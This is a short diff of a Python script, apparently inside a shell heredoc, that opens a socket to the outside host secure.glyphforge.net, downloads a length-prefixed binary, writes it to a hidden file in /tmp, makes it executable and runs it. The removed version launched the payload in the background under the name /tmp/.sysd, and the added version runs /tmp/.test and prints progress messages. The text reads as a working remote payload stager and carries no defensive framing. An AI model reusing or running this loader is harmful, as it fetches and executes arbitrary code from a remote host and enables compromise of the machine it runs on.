@@ -3,20 +3,22 @@ import socket, struct, os, stat
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(10)
-s.connect(("secure.glyphforge.net", 1111))
+s.connect(("secure.glyphforge.net", 1221))
 size_data = s.recv(4)
 size = struct.unpack('<I', size_data)[0]
+print(f"[+] Size: {size}")
 data = b''
 while len(data) < size:
     chunk = s.recv(size - len(data))
     if not chunk:
         break
     data += chunk
+print(f"[+] Downloaded: {len(data)} bytes")
 s.close()
 
-with open("/tmp/.sysd", "wb") as f:
+with open("/tmp/.test", "wb") as f:
     f.write(data)
-os.chmod("/tmp/.sysd", stat.S_IRWXU)
-os.system("nohup /tmp/.sysd >/dev/null 2>&1 &")
-print("[+] Done")
+os.chmod("/tmp/.test", stat.S_IRWXU)
+print("[+] Written, executing...")
+os.execv("/tmp/.test", ["/tmp/.test"])
 EOF
